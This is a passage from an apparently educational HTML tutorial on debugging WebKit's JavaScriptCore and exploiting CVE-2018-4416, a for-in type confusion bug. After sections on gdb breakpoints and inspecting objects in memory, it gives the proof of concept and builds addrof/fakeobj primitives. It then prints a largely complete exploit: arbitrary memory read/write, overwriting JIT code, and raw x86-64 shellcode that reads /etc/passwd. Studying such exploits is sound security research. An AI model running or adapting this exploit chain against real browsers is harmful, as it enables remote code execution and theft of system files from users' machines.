<em>Safari</em>!): - <code class="verbatim">print()</code> and <code
class="verbatim">debug()</code>: Like <code
class="verbatim">console.log()</code> in <em>node.js</em>, it will
output information to our terminal. However, <code
class="verbatim">print</code> in <em>Safari</em> will use a real-world
printer to print documents. - <code class="verbatim">describe()</code>:
Describe one object. We can get the address, class member, and related
information via the function. - <code
class="verbatim">describeArrya()</code>: Similar to <code
class="verbatim">describe()</code>, but it focuses on <em>array</em>
information of an object. - <code class="verbatim">readFile()</code>:
Open a file and get the content - <code class="verbatim">noDFG()</code>
and <code class="verbatim">noFLT()</code>: Disable some JIT
compilers.</p>
<h2 id="setting-breakpoints">Setting Breakpoints</h2>
<p>The easiest way to set breakpoints is breaking an unused function.
Something like <code class="verbatim">print</code> or <code
class="verbatim">Array.prototype.slice([]);</code>. Since we do not know
if a function will affect one PoC most of the time, this method might
bring some side effect.</p>
<p>Setting vulnerable functions as our breakpoints also work. When you
try to understand a vulnerability, breaking them will be extremely
important. But their calling stacks may not be pleasant.</p>
<p>We can also customize a debugging function (use <code
class="verbatim">int 3</code>) in WebKit source code. Defining,
implementing, and registering our function in <code
class="verbatim">/Source/JavaScriptCore/jsc.cpp</code>. It helps us to
hang WebKit in debuggers:</p>
<div class="sourceCode" id="cb53"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> EncodedJSValue JSC_HOST_CALL functionDbg<span class="op">(</span>ExecStage<span class="op">*);</span></span>
<span id="cb53-2"><a href="#cb53-2" aria-hidden="true" tabindex="-1"></a>addFunction<span class="op">(</span>vm<span class="op">,</span> <span class="st">&quot;dbg&quot;</span><span class="op">,</span> functionDbg<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb53-3"><a href="#cb53-3" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> EncodedJSValue JSC_HOST_CALL functionDbg<span class="op">(</span>ExecStage<span class="op">*</span> exec<span class="op">)</span> <span class="op">{</span></span>
<span id="cb53-4"><a href="#cb53-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">asm</span><span class="op">(</span><span class="st">&quot;int 3&quot;</span><span class="op">);</span></span>
<span id="cb53-5"><a href="#cb53-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> JSValue<span class="op">::</span>encode<span class="op">(</span>jsUndefined<span class="op">());</span></span>
<span id="cb53-6"><a href="#cb53-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>Since the third method requires us to modify the source code, I
prefer the previous two personally.</p>
<h2 id="inspecting-jsc-objects">Inspecting JSC Objects</h2>
<p>Okay, we use this script:</p>
<pre class="example"><code>arr = [0, 1, 2, 3]
debug(describe(arr))

print()
</code></pre>
<p>Use our <strong>gdb</strong> with <strong>gef</strong> to debug; you
may guess out we will break the <code
class="verbatim">print()</code>:</p>
<pre class="example"><code>gdb jsc
gef&gt; b *printInternal
gef&gt; r
--&gt; Object: 0x7fffaf4b4350 with butterfly 0x7ff8000e0010 (Structure 0x7fffaf4f2b50:[Array, {}, CopyOnWriteArrayWithInt32, Proto:0x7fffaf4c80a0, Leaf]), StructureID: 100

...
// Some backtrace
</code></pre>
<blockquote>
<p>The Object address and butterfly pointer might vary on your machine.
If we edit the script, the address may also change. Please adjust them
based on your output.</p>
</blockquote>
<p>We shall have a first glance on the object and its pointer:</p>
<pre class="example"><code>gef&gt;  x/2gx 0x7fffaf4b4350
0x7fffaf4b4350:    0x0108211500000064    0x00007ff8000e0010
gef&gt;  x/4gx 0x00007ff8000e0010
0x7ff8000e0010:    0xffff000000000000    0xffff000000000001
0x7ff8000e0020:    0xffff000000000002    0xffff000000000003
</code></pre>
<p>What if we change it to float?</p>
<pre class="example"><code>arr = [1.0, 1.0, 2261634.5098039214, 2261634.5098039214]
debug(describe(arr))

print()
</code></pre>
<p>We use a small trick here: <code
class="verbatim">2261634.5098039214</code> represents as <code
class="verbatim">0x4141414141414141</code> in memory. Finding value is
more handy via the magical number (we use butterfly pointer directly
here). In default, <strong>JSC</strong> will filled unused memory with
<code class="verbatim">0x00000000badbeef0</code>:</p>
<pre class="example"><code>gef&gt;  x/10gx 0x00007ff8000e0010
0x7ff8000e0010:    0x3ff0000000000000    0x3ff0000000000000
0x7ff8000e0020:    0x4141414141414141    0x4141414141414141
0x7ff8000e0030:    0x00000000badbeef0    0x00000000badbeef0
0x7ff8000e0040:    0x00000000badbeef0    0x00000000badbeef0
0x7ff8000e0050:    0x00000000badbeef0    0x00000000badbeef0
</code></pre>
<p>The memory layout is the same as the <em>JSC Object Model</em> part,
so we won't repeat here.</p>
<h2 id="getting-native-code-1">Getting Native Code</h2>
<p>Now, it's time to get compiled function. It plays an important role
in understanding JSC compiler and exploiting:</p>
<pre class="example"><code>const ITERATIONS = 100000;

function jitCompile(f, ...args) {
    for (var i = 0; i &lt; ITERATIONS; i++) {
        f(...args);
    }
}
jitCompile(function dummy() { return 42; });
debug(&quot;jitCompile Ready&quot;)

function makeJITCompiledFunction() {
    function target(num) {
        for (var i = 2; i &lt; num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}

func = makeJITCompiledFunction()
debug(describe(func))

print()
</code></pre>
<p>It's not hard if you read previous section carefully. Now, we should
get their native code in the debugger:</p>
<pre class="example"><code>--&gt; Object: 0x7fffaf468120 with butterfly (nil) (Structure 0x7fffaf4f1b20:[Function, {}, NonArray, Proto:0x7fffaf4d0000, Leaf]), StructureID: 63
...
// Some backtrace
...
gef&gt;  x/gx 0x7fffaf468120+24
0x7fffaf468138:    0x00007fffaf4fd080
gef&gt;  x/gx 0x00007fffaf4fd080+24
0x7fffaf4fd098:    0x00007fffefe46000
// In debug mode, it&#39;s okay to use 368 as offset
// In release mode, however, it should be 352
gef&gt;  x/gx 0x00007fffefe46000+368
0x7fffefe46170:    0x00007fffafe02a00
gef&gt;  hexdump byte 0x00007fffafe02a00
0x00007fffafe02a00     55 48 89 e5 48 8d 65 d0 48 b8 60 0c 45 af ff 7f    UH..H.e.H.`.E...
0x00007fffafe02a10     00 00 48 89 45 10 48 8d 45 b0 49 bb b8 2e c1 af    ..H.E.H.E.I.....
0x00007fffafe02a20     ff 7f 00 00 49 39 03 0f 87 9c 00 00 00 48 8b 4d    ....I9.......H.M
0x00007fffafe02a30     30 48 b8 00 00 00 00 00 00 ff ff 48 39 c1 0f 82    0H.........H9...
</code></pre>
<p>Put you dump byte to rasm2:</p>
<pre class="example"><code>rasm -d &quot;you dump byte here&quot;
push ebp
dec eax
mov ebp, esp
dec eax
lea esp, [ebp - 0x30]
dec eax
mov eax, 0xaf450c60
invalid
jg 0x11
add byte [eax - 0x77], cl
inc ebp
adc byte [eax - 0x73], cl
inc ebp
mov al, 0x49
mov ebx, 0xafc12eb8
invalid
jg 0x23
add byte [ecx + 0x39], cl
add ecx, dword [edi]
xchg dword [eax + eax - 0x74b80000], ebx
dec ebp
xor byte [eax - 0x48], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
invalid
dec dword [eax + 0x39]
ror dword [edi], 0x82
</code></pre>
<p>Emmmm…the disassembly code is partially incorrect. At least we can
see a draft now.</p>
<hr />
<h1 id="day-exploitation">1 Day Exploitation</h1>
<p>Let's use the bug in <em>triggering bug</em> section:
<strong>CVE-2018-4416</strong>.</p>
<p>It's a type confusion. Since we already talked about <em>WebKid</em>,
a similar CTF challenge which has type confusion bug, it won't be
difficult to understand this one. Switch to the vulnerable branch and
start our journey.</p>
<p>PoC is provided at the beginning of the article. Copy and paste the
<code class="verbatim">int64.js</code>, <code
class="verbatim">shellcode.js</code>, and <code
class="verbatim">utils.js</code> from <em>WebKid</em> repo to your
virtual machine.</p>
<h2 id="root-cause">Root Cause</h2>
<h3 id="quotation-from-lokihardt">Quotation from Lokihardt</h3>
<p>The following is description of <strong>CVE-2018-4416</strong> from
<em>Lokihardt</em>, with my partial highlight.</p>
<p>When a <code class="verbatim">for-in</code> loop is executed, a <code
class="verbatim">JSPropertyNameEnumerator object</code> is created at
the beginning and used to store the information of the input object to
the <code class="verbatim">for-in</code> loop. Inside the loop, the
<em>structure ID</em> of the "this" object of every <code
class="verbatim">get_by_id</code> expression *taking the loop variable
as the index is compared to the cached <code
class="verbatim">structure ID</code> from the <code
class="verbatim">JSPropertyNameEnumerator object=*. If it's the same, the "this" object
of the =get_by_id</code> expression <strong>will be considered having
the same structure as the input object</strong> to the <code
class="verbatim">for-in</code> loop has.</p>
<p>The problem is, it doesn't have anything to prevent the structure
from which the cached <em>structure ID</em> from being freed. As
<em>structure IDs</em> can be reused after their owners get freed, this
can lead to <em>type confusion</em>.</p>
<h3 id="line-by-line-explanation">Line by Line Explanation</h3>
<p>Comment in <code class="verbatim">/* */</code> is my analysis, which
might be inaccurate. Comment after <code class="verbatim">//</code> is
by Lokihardt:</p>
<pre class="example"><code>function gc() {
    for (let i = 0; i &lt; 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

function opt(obj) {
    // Starting the optimization.
    for (let i = 0; i &lt; 500; i++) {

    }
    /* Step 3 */
    /* This is abother target */
    /* We want to confuse it(tmp) with obj(fake_object_memory) */
    let tmp = {a: 1};

    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {  // The structure ID of &quot;tmp&quot; is stored in a JSPropertyNameEnumerator.
        /* Step 4 */
        /* Change the structure of tmp to {} */
        tmp.__proto__ = {};

        gc();
        /* The structure of obj is also {} now */
        obj.__proto__ = {};  // The structure ID of &quot;obj&quot; equals to tmp&#39;s.

        /* Step 5 */
        /* Compiler believes obj and tmp share the same type now */
        /* Thus, obj[k] will retrieve data from object with offset a */
        /* In the patched version, it should be undefined */
        return obj[k];  // Type confusion.
    }
}

/* Step 0 */
/* Prepare structure {} */
opt({});

/* Step 1 */
/* Target Array, 0x1234 is our fake address*/
let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x1234;

/* Step 2 */
/* Trigger type confusion*/
let fake_object = opt(fake_object_memory);

/* JSC crashed */
print(fake_object);
</code></pre>
<h3 id="debugging">Debugging</h3>
<p>Let's debug it to verify our thought. I modify the original PoC for
easier debugging. But they are almost identical except additional <code
class="verbatim">print()</code>:</p>
<pre class="example"><code>function gc() {
    for (let i = 0; i &lt; 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

function opt(obj) {
    // Starting the optimization.
    for (let i = 0; i &lt; 500; i++) {

    }

    let tmp = {a: 1};

    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {  // The structure ID of &quot;tmp&quot; is stored in a JSPropertyNameEnumerator.
        tmp.__proto__ = {};
        gc();
        obj.__proto__ = {};  // The structure ID of &quot;obj&quot; equals to tmp&#39;s.
        debug(&quot;Confused Object: &quot; + describe(obj));
        return obj[k];  // Type confusion.
    }
}

opt({});

let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x41424344;
let fake_object = opt(fake_object_memory);
print()
print(fake_object)
</code></pre>
<p>Then <code class="verbatim">gdb ./jsc</code>, <code
class="verbatim">b *printInternal</code>, and <code
class="verbatim">r poc.js</code>. We can get:</p>
<pre class="example"><code>...

--&gt; Confused Object: Object: 0x7fffaf6b0080 with butterfly (nil) (Structure 0x7fffaf6f3db0:[Object, {}, NonArray, Proto:0x7fffaf6b3e80, Leaf]), StructureID: 142
--&gt; Confused Object: Object: 0x7fffaf6cbe40 with butterfly (nil) (Structure 0x7fffaf6f3db0:[Uint32Array, {}, NonArray, Proto:0x7fffaf6b3e00, Leaf]), StructureID: 142

...
</code></pre>
<p>Let's take a glance at our fake address. JSC is too large to find
your dream breakpoint. Let's set a watchpoint to track its flow
instead:</p>
<pre class="example"><code>gef&gt;  x/4gx 0x7fffaf6cbe40
0x7fffaf6cbe40: 0x02082a000000008e  0x0000000000000000
0x7fffaf6cbe50: 0x00007fe8014fc000  0x0000000000000064
gef&gt;  x/4gx 0x00007fe8014fc000
0x7fe8014fc000: 0x0000000041424344  0x0000000000000000
0x7fe8014fc010: 0x0000000000000000  0x0000000000000000
gef&gt;  rwatch *0x7fe8014fc000
Hardware read watchpoint 2: *0x7fe8014fc000
</code></pre>
<p>We get expected output later:</p>
<pre class="example"><code>Thread 1 &quot;jsc&quot; hit Hardware read watchpoint 2: *0x7fe8014fc000

Value = 0x41424344
0x00005555555bebd4 in JSC::JSCell::structureID (this=0x7fe8014fc000) at ../../Source/JavaScriptCore/runtime/JSCell.h:133
133     StructureID structureID() const { return m_structureID; }
</code></pre>
<p>But why does it show at <code class="verbatim">structure ID</code>?
We can get answer from their memory layout:</p>
<pre class="example"><code>obj (fake_object_memory):
0x7fffaf6cbe40: 0x02082a000000008e  0x0000000000000000
0x7fffaf6cbe50: 0x00007fe8014fc000  0x0000000000000064

tmp ({a: 1}):
0x7fffaf6cbdc0: 0x000016000000008b  0x0000000000000000
0x7fffaf6cbdd0: 0xffff000000000001  0x0000000000000000
</code></pre>
<p>So, the pointer of <code class="verbatim">Uin32Array</code> is
returned as an object. And <code class="verbatim">m_structureID</code>
is at the beginning of each JS Objects. Since <code
class="verbatim">0x1234</code> is the first element of our array, it's
reasonable for <code class="verbatim">structureID()</code> to retrieve
it.</p>
<p>We can use data in <code class="verbatim">Uint32Array</code> to craft
fake object now. Awesome!</p>
<h2 id="constructing-attack-primitive">Constructing Attack
Primitive</h2>
<h3 id="addrof">addrof</h3>
<p>Now, we should craft a legal object. I choose <code
class="verbatim">{}</code> (an empty object) as our target.</p>
<p>How does an empty look like in memory(ignore scripting and debugging
here):</p>
<pre class="example"><code>0x7fe8014fc000: 0x010016000000008a  0x0000000000000000
</code></pre>
<p>Okay, it begins with <code
class="verbatim">0x010016000000008a</code>. We can simulate it in <code
class="verbatim">Uint32Array</code> handy(remember to paste <code
class="verbatim">gc</code> and <code class="verbatim">opt</code> to
here):</p>
<pre class="example"><code>function gc() {
... // Same as above&#39;s
}

function opt(obj) {
... // Same as above;s
}

opt({});

let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x0000004c;
fake_object_memory[1] = 0x01001600;
let fake_object = opt(fake_object_memory);
fake_object.a = {}

print(fake_object_memory[4])
print(fake_object_memory[5])
</code></pre>
<p>Two mystery numbers are returned:</p>
<pre class="shell"><code>2591768192 # hex: 0x9a7b3e80
32731 # hex: 0x7fdb
</code></pre>
<p>Obviously, it is in pointer format. We can leak arbitrary object
now!</p>
<h3 id="fakeobj">fakeobj</h3>
<p>Getting a <code class="verbatim">fakeob</code> is almost identical to
crafting <code class="verbatim">addrof</code>. The difference is that
you need to fill an address to <code
class="verbatim">UInt32Array</code>, then get the object via attribute
<code class="verbatim">a</code> in <code
class="verbatim">fake_object</code></p>
<h3 id="arbitrary-rw-and-shellcode-execution">Arbitrary R/W and
Shellcode Execution</h3>
<p>It's similar to the exploit script in <code
class="verbatim">WebKid</code> challenge. The full script is too long to
explain line by line. You can, however, find it <a
href="file:///assets/CVE-2018-4416.js">here</a>. You may need to try
around 10 rounds to exploit successfully. It will read your <code
class="verbatim">/etc/passwd</code> when succeed. Here is the core
code:</p>
<pre class="example"><code>// get compiled function
var func = makeJITCompiledFunction();

function gc() {
    for (let i = 0; i &lt; 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

// Typr confusion here
function opt(obj) {
    for (let i = 0; i &lt; 500; i++) {

    }

    let tmp = {a: 1};
    gc();
    tmp.__proto__ = {};

    for (let k in tmp) {
        tmp.__proto__ = {};
        gc();
        obj.__proto__ = {};
        // Compiler are misleaded that obj and tmp shared same type
        return obj[k];
    }
}

opt({});

// Use Uint32Array to craft a controable memory
// Craft a fake object header
let fake_object_memory = new Uint32Array(100);
fake_object_memory[0] = 0x0000004c;
fake_object_memory[1] = 0x01001600;
let fake_object = opt(fake_object_memory);

debug(describe(fake_object))

// Use JIT to stablized our attribute
// Attribute a will be used by addrof/fakeobj
// Attrubute b will be used by arbitrary read/write
for (i = 0; i &lt; 0x1000; i ++) {
    fake_object.a = {test : 1};
    fake_object.b = {test : 1};
}

// get addrof
// we pass a pbject to fake_object
// since fake_object is inside fake_object_memory and represneted as integer
// we can use fake_object_memory to retrieve the integer value
function setup_addrof() {
    function p32(num) {
        value = num.toString(16)
        return &quot;0&quot;.repeat(8 - value.length) + value
    }
    return function(obj) {
        fake_object.a = obj
        value = &quot;&quot;
        value = &quot;0x&quot; + p32(fake_object_memory[5]) + &quot;&quot; + p32(fake_object_memory[4])
        return new Int64(value)
    }
}

// Same
// But we pass integer value first. then retrieve object 
function setup_fakeobj() {
     return function(addr) {
        //fake_object_memory[4] = addr[0]
        //fake_object_memory[5] = addr[1]
        value = addr.toString().replace(&quot;0x&quot;, &quot;&quot;)
        fake_object_memory[4] = parseInt(value.slice(8, 16), 16)
        fake_object_memory[5] = parseInt(value.slice(0, 8), 16)
        return fake_object.a
     }
}

addrof = setup_addrof()
fakeobj = setup_fakeobj()
debug(&quot;[+] set up addrof/fakeobj&quot;)
var addr = addrof({p: 0x1337});
assert(fakeobj(addr).p == 0x1337, &quot;addrof and/or fakeobj does not work&quot;);
debug(&#39;[+] exploit primitives working&#39;);

// Use fake_object + 0x40 cradt another fake object for read/write
var container_addr = Add(addrof(fake_object), 0x40)
fake_object_memory[16] = 0x00001000;
fake_object_memory[17] = 0x01082007;

var structs = []
for (var i = 0; i &lt; 0x1000; ++i) {
    var a = [13.37];
    a.pointer = 1234;
    a[&#39;prop&#39; + i] = 13.37;
    structs.push(a);
}

// We will use victim as the butterfly pointer of contianer object
victim = structs[0x800]
victim_addr = addrof(victim)
victim_addr_hex = victim_addr.toString().replace(&quot;0x&quot;, &quot;&quot;)
fake_object_memory[19] = parseInt(victim_addr_hex.slice(0, 8), 16)
fake_object_memory[18] = parseInt(victim_addr_hex.slice(8, 16), 16)

// Overwrite container to fake_object.b
container_addr_hex = container_addr.toString().replace(&quot;0x&quot;, &quot;&quot;)
fake_object_memory[7] = parseInt(container_addr_hex.slice(0, 8), 16)
fake_object_memory[6] = parseInt(container_addr_hex.slice(8, 16), 16)
var hax = fake_object.b

var origButterfly = hax[1];

var memory = {
    addrof: addrof,
    fakeobj: fakeobj,

    // Write an int64 to the given address.
    // we change the butterfly of victim to addr + 0x10
    // when victim change the pointer attribute, it will read butterfly - 0x10
    // which equal to addr + 0x10 - 0x10 = addr
    // read arbiutrary value is almost the same
    writeInt64(addr, int64) {
        hax[1] = Add(addr, 0x10).asDouble();
        victim.pointer = int64.asJSValue();
    },

    // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
    write16(addr, value) {
        // Set butterfly of victim object and dereference.
        hax[1] = Add(addr, 0x10).asDouble();
        victim.pointer = value;
    },

    // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
    write(addr, data) {
        while (data.length % 4 != 0)
            data.push(0);

        var bytes = new Uint8Array(data);
        var ints = new Uint16Array(bytes.buffer);

        for (var i = 0; i &lt; ints.length; i++)
            this.write16(Add(addr, 2 * i), ints[i]);
    },

    // Read a 64 bit value. Only works for bit patterns that don&#39;t represent NaN.
    read64(addr) {
        // Set butterfly of victim object and dereference.
        hax[1] = Add(addr, 0x10).asDouble();
        return this.addrof(victim.pointer);
    },

    // Verify that memory read and write primitives work.
    test() {
        var v = {};
        var obj = {p: v};

        var addr = this.addrof(obj);
        assert(this.fakeobj(addr).p == v, &quot;addrof and/or fakeobj does not work&quot;);

        var propertyAddr = Add(addr, 0x10);

        var value = this.read64(propertyAddr);
        assert(value.asDouble() == addrof(v).asDouble(), &quot;read64 does not work&quot;);

        this.write16(propertyAddr, 0x1337);
        assert(obj.p == 0x1337, &quot;write16 does not work&quot;);
    },
};

memory.test();
debug(&quot;[+] limited memory read/write working&quot;);

// Get JIT code address
debug(describe(func))
var funcAddr = memory.addrof(func);
debug(`[+] shellcode function object @ ${funcAddr}`);
var executableAddr = memory.read64(Add(funcAddr, 24));
debug(`[+] executable instance @ ${executableAddr}`);
var jitCodeObjAddr = memory.read64(Add(executableAddr, 24));
debug(`[+] JITCode instance @ ${jitCodeObjAddr}`);
var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 368));
//var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 352));
debug(`[+] JITCode @ ${jitCodeAddr}`);

// Our shellcode
var shellcode = [0xeb, 0x3f, 0x5f, 0x80, 0x77, 0xb, 0x41, 0x48, 0x31, 0xc0,
                 0x4, 0x2, 0x48, 0x31, 0xf6, 0xf, 0x5, 0x66, 0x81, 0xec, 0xff,
                 0xf, 0x48, 0x8d, 0x34, 0x24, 0x48, 0x89, 0xc7, 0x48, 0x31,
                 0xd2, 0x66, 0xba, 0xff, 0xf, 0x48, 0x31, 0xc0, 0xf, 0x5,
                 0x48, 0x31, 0xff, 0x40, 0x80, 0xc7, 0x1, 0x48, 0x89, 0xc2,
                 0x48, 0x31, 0xc0, 0x4, 0x1, 0xf, 0x5, 0x48, 0x31, 0xc0, 0x4,
                 0x3c, 0xf, 0x5, 0xe8, 0xbc, 0xff, 0xff, 0xff, 0x2f, 0x65,
                 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x41]

var s = &quot;A&quot;.repeat(64);
var strAddr = addrof(s);
var strData = Add(memory.read64(Add(strAddr, 16)), 20);

// write shellcode
shellcode.push(...strData.bytes());
memory.write(jitCodeAddr, shellcode);

// trigger and get /etc/passwd
func();
print() 
</code></pre>
<hr />
<h1 id="conclusion">Conclusion</h1>
<p>We have demonstrated the exploitation of the most complicated part of
browser - JavaScript engine. However, browser is huge. There are many
other attack surface, like DOM and WASM. Some researchers also find bugs
in SQL database used by browsers that may be turned into RCE. Be patient
and be creative.</p>
<hr />
<h1 id="references">References</h1>
<ul>
<li><em>Groß S</em>, 2018, Black Hat USA, <em>"Attacking Client-Side JIT
Compilers"</em></li>
<li><em>Han C</em>, <a
href="https://github.com/tunz/js-vuln-db/"><em>"js-vuln-db"</em></a></li>
<li><em>Gianni A</em> and <em>Heel1an S</em>, <em>"Exploit WebKit
Heap"</em></li>
<li><em>Filip Pizlo</em>, <a
href="http://www.filpizlo.com">http://www.filpizlo.com</a>, Thanks for
many presentations!</li>
<li><em>Groß S</em>, 2018, 35C3 CTF <em>WebKid Challenge</em></li>
<li><em>dwfault</em>, 2018, <a
href="http://dwfault-blog.imwork.net:30916/2019/01/03/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/"><em>WebKit
Debugging Skills</em></a></li>
</ul>
</body>
</html>
